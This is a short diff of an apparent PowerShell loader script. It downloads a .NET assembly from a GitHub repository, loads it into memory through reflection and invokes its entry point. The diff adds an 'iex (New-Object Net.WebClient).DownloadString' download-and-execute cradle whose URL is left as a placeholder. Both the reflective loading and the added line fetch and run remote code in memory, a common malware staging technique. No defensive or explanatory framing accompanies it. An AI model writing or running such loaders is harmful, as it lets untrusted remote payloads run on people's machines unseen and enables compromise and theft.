@@ -4,5 +4,7 @@ $downloadUrl = "https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/
 $assemblyBytes = Invoke-WebRequest -Uri $downloadUrl -UseBasicParsing
 $assembly = [System.Reflection.Assembly]::Load($assemblyBytes.Content)
 
+iex (New-Object Net.WebClient).DownloadString('REPLACE')
+
 $entryPoint = $assembly.EntryPoint
 $entryPoint.Invoke($null, (, [string[]] ('foo', 'bar')))
